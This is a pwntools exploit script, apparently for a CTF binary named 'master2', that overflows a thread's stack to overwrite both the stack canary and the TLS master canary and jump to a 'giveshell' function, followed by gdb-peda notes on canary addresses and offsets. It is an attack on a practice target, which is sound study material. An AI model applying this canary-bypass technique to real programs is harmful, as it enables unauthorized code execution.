from pwn import *
import os

BIN="./master2"

e=ELF(BIN)
p=process(BIN)

# giveshell address
give_shell = e.symbols['giveshell']
print p.sendlineafter("Size: ", str(0x10000))
raw_input()
# thread_routine payload
payload = "A"*264
payload += "master12"
payload += "B"*8
payload += p64(give_shell)


# mc12 + 
payload += "C"*(0x7c8)
payload += "master12"

# pause()
# mc2
print p.sendlineafter("Data: ", payload)

p.interactive()

# 0x7f08e174cf58
# 0x7ffd66aab148

# Searching for '0xc40edd6f0f39cd00' in: None ranges
# Found 3 results, display max 3 items:
#  mapped : 0x7f7ddc700728 --> 0xc40edd6f0f39cd00 
#  mapped : 0x7f7ddcf03728 --> 0xc40edd6f0f39cd00 
# [stack] : 0x7fffd7d44cf8 --> 0xc40edd6f0f39cd00 


# 0x7fffd7d44cf8
# 0x400a90
# 0x7f7ddcf03728
# 0x7f7ddcce3270

# mapped : 0x7f5c9c854f48 ("master12BBBBBBBBF\t@")
# mapped : 0x7f5c9c855728 ("master12\n\031/\373\242\n\214\325")



# thead_routine() 에서 비교되는 카나리 값의 주소 ->
# 0x7fa6c047f51d

# main() 에서 비교되는 카나리 값의 주소
# 0x7fa6c0687270

# Searching for '0xbb38e739eef99900' in: None ranges
# Found 3 results, display max 3 items:
#  mapped : 0x7f2f32ff7728 --> 0xbb38e739eef99900 
#  mapped : 0x7f2f337fa728 --> 0xbb38e739eef99900 
# [stack] : 0x7ffc64791178 --> 0xbb38e739eef99900 

#  mapped : 0x7f2f32ff6f48 --> 0xbb38e739eef99900 

#  0x7f2f32ff6f40+0x7c8

#  0x7f2f32ff7708

#  0x7f2f337fa728-0x7f2f32ff7728


# 0x7f76ad1e851d


#  mapped : 0x7f05d1fb2f48 --> 0x4c16672b0fcccb00 STACK[T]
#  mapped : 0x7f05d1fb3728 --> 0x4c16672b0fcccb00 CEHCK[T]

#  mapped : 0x7f05d27b6728 --> 0x4c16672b0fcccb00 
# [stack] : 0x7ffeb4f71bb8 --> 0x4c16672b0fcccb00 




# p/x 0x7f05d1fb3728-0x7f05d1fb2f40  

# gdb-peda$ p/x 0x7f05d1fb3728-0x7f05d1fb2f40
# $10 = 0x7e8

